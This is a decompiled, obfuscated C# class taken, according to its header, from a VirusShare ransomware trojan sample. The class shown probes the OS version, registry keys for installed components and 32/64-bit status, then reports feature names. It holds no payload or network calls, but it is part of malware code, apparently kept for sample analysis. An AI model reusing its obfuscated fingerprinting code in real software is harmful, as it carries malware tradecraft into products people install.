// Decompiled with JetBrains decompiler
// Type: .
// Assembly: BOMBS, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b01670ee6fa4859f
// MVID: D5D8F5B0-12EB-4325-8C3D-C60F341D062A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.jjta-28a226e15e1e7b94528e46718041b3f49976b446eb3daccd652d0e5b43f948be.exe

using \u0002;
using \u0004;
using Microsoft.Win32;
using SmartAssembly.SmartUsageCore;
using System;
using System.Runtime.InteropServices;

namespace \u0004
{
  internal static class \u0008
  {
    [NonSerialized]
    internal static \u000F.\u0001 \u0087;

    public static void \u0001()
    {
      int num1;
      int num2;
      int num3;
      try
      {
        try
        {
          if (\u0008.\u0001(\u0008.\u0087(3092790)))
            \u0008.\u0001(\u0008.\u0087(3092795));
          else if (\u0008.\u0001(\u0008.\u0087(3092836)))
            \u0008.\u0001(\u0008.\u0087(3092845));
          else if (\u0008.\u0001(\u0008.\u0087(3092886)))
            \u0008.\u0001(\u0008.\u0087(3092895));
          else if (\u0008.\u0001(\u0008.\u0087(3092936)))
            \u0008.\u0001(\u0008.\u0087(3092953));
          else if (\u0008.\u0001(\u0008.\u0087(3092994)))
            \u0008.\u0001(\u0008.\u0087(3093007));
          num1 = \u0019.\u007E\u0012\u0002((object) \u000F\u0002.\u007E\u009E\u0003((object) \u000E\u0002.\u009D\u0003()));
          switch (num1)
          {
            case 5:
              num2 = \u0019.\u007E\u001D\u0002((object) \u000F\u0002.\u007E\u009E\u0003((object) \u000E\u0002.\u009D\u0003()));
              switch (num2)
              {
                case 0:
                  \u0008.\u0001(\u0008.\u0087(3093048));
                  break;
                case 1:
                  \u0008.\u0001(\u0008.\u0087(3093081));
                  break;
                case 2:
                  \u0008.\u0001(\u0008.\u0087(3093110));
                  break;
              }
              break;
            case 6:
              num3 = \u0019.\u007E\u001D\u0002((object) \u000F\u0002.\u007E\u009E\u0003((object) \u000E\u0002.\u009D\u0003()));
              switch (num3)
              {
                case 0:
                  \u0008.\u0001(\u0008.\u0087(3093143));
                  break;
                case 1:
                  \u0008.\u0001(\u0008.\u0087(3093184));
                  break;
              }
              break;
          }
          \u0008.\u0002();
          \u0008.\u0003();
          \u0008.\u0004();
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) num2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) num3;
        \u0001.\u0003.\u0001(ex, (object) local1, (object) local2, (object) local3);
        throw;
      }
    }

    public static void \u0002()
    {
      try
      {
        try
        {
          \u0008.\u0001(\u0087\u0003.\u0002\u0006((object) \u0008.\u0087(3093221), (object) \u0086\u0003.\u009F\u0005()));
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        \u0001.\u0003.\u0001(ex);
        throw;
      }
    }

    public static void \u0003()
    {
      try
      {
        try
        {
          do
          {
            string featureName = \u001E.\u0082\u0002(\u0008.\u0087(3093250), global::\u0002.\u007E\u0017((object) \u0088\u0003.\u0003\u0006()));
            if (true)
              goto label_3;
label_1:
            continue;
label_3:
            \u0008.\u0001(featureName);
            goto label_1;
          }
          while (false);
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        \u0001.\u0003.\u0001(ex);
        throw;
      }
    }

    public static void \u0004()
    {
      try
      {
        try
        {
          \u0008.\u0001(\u0008.\u0087(3093283) + (object) (\u0008.\u0001() ? 64 : 32));
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        \u0001.\u0003.\u0001(ex);
        throw;
      }
    }

    private static bool \u0001()
    {
      bool wow64Process;
      bool flag;
      try
      {
        if (\u0086\u0003.\u0001\u0006() != 8)
          goto label_2;
label_1:
        int num1 = 1;
        int num2;
        if (num1 == 0)
        {
          num2 = num1;
          goto label_3;
        }
        else
        {
          flag = num1 != 0;
          if (false)
            goto label_11;
          else
            goto label_14;
        }
label_2:
        num2 = \u0008.\u0001(\u0008.\u0087(3093312), \u0008.\u0087(3093329)) ? 1 : 0;
label_3:
        int num3;
        if (num2 != 0)
          num3 = \u0008.\u0001(\u0008.\u0001(), out wow64Process) ? 1 : 0;
        else
          goto label_8;
label_4:
        if (true)
        {
          if (num3 == 0)
            goto label_8;
          else
            goto label_11;
        }
label_6:
        if (true)
        {
          flag = num3 != 0;
          if (false)
            goto label_1;
          else
            goto label_14;
        }
        else
          goto label_4;
label_8:
        flag = false;
        goto label_14;
label_11:
        num3 = wow64Process ? 1 : 0;
        goto label_6;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<bool> local = (ValueType) wow64Process;
        \u0001.\u0003.\u0001(ex, (object) local);
        throw;
      }
label_14:
      return flag;
    }

    private static bool \u0001([In] string obj0, [In] string obj1)
    {
      bool flag;
      IntPtr hModule;
      try
      {
        if (true)
        {
          hModule = \u0008.\u0001(obj0);
          int num;
          for (int index = \u0089\u0003.\u0004\u0006(hModule, IntPtr.Zero) ? 1 : 0; index == 0; index = num)
          {
            num = \u0089\u0003.\u0005\u0006(\u0008.\u0001(hModule, obj1), IntPtr.Zero) ? 1 : 0;
            if (true)
            {
              flag = num != 0;
              goto label_8;
            }
          }
          flag = false;
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<IntPtr> local = (ValueType) hModule;
        string str1 = obj0;
        string str2 = obj1;
        \u0001.\u0003.\u0001(ex, (object) local, (object) str1, (object) str2);
        throw;
      }
label_8:
      return flag;
    }

    [DllImport("kernel32.dll", EntryPoint = "GetCurrentProcess")]
    private static extern IntPtr \u0001();

    [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle", CharSet = CharSet.Auto)]
    private static extern IntPtr \u0001([In] string obj0);

    [DllImport("kernel32", EntryPoint = "GetProcAddress", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr \u0001(IntPtr hModule, [MarshalAs(UnmanagedType.LPStr)] string procName);

    [DllImport("kernel32.dll", EntryPoint = "IsWow64Process", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool \u0001(IntPtr hProcess, out bool wow64Process);

    private static bool \u0001([In] string obj0)
    {
      RegistryKey registryKey1;
      bool flag;
      try
      {
        registryKey1 = (RegistryKey) null;
        try
        {
          registryKey1 = \u001C.\u007E\u007F\u0002((object) Registry.LocalMachine, \u001E.\u0082\u0002(\u0008.\u0087(3093350), obj0)) ?? \u001C.\u007E\u007F\u0002((object) Registry.LocalMachine, \u001E.\u0082\u0002(\u0008.\u0087(3093411), obj0));
          flag = registryKey1 != null;
        }
        finally
        {
          if (registryKey1 != null)
            \u0015.\u007E\u008B((object) registryKey1);
        }
        return flag;
      }
      catch (Exception ex)
      {
        RegistryKey registryKey2 = registryKey1;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local = (ValueType) flag;
        string str = obj0;
        \u0001.\u0003.\u0001(ex, (object) registryKey2, (object) local, (object) str);
        throw;
      }
    }

    public static void \u0001([FeatureName, \u0006] string featureName) => \u0003.\u0004.\u0001(featureName);

    static \u0008() => \u0004.\u0002.\u0001(typeof (\u0008));
  }
}
